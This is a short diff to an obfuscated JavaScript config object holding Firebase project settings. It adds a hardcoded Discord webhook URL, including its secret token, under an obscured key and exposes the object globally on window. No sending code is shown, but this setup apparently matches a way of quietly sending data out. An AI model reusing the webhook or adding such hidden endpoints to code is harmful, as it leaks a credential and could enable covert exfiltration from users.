@@ -5,7 +5,8 @@
     _0x1f9c: "moscow-live-tests",
     _0x4e3b: "moscow-live-tests.firebasestorage.app",
     _0x5a8c: "956332293918",
-    _0x3a2f: "1:956332293918:web:e7f66986cca2a30474130f"
+    _0x3a2f: "1:956332293918:web:e7f66986cca2a30474130f",
+    _0x7d8e: "https://discord.com/api/webhooks/1503013566289281037/5hJsRG7FVQK0hG3j8NSCIqwg-qmf39fi8tzsbL_IaCJnWtjHJ9RMyL-yf8Z5OVdT1MXR"
   };
   
   window._0x2c3a = _0x1f3e;
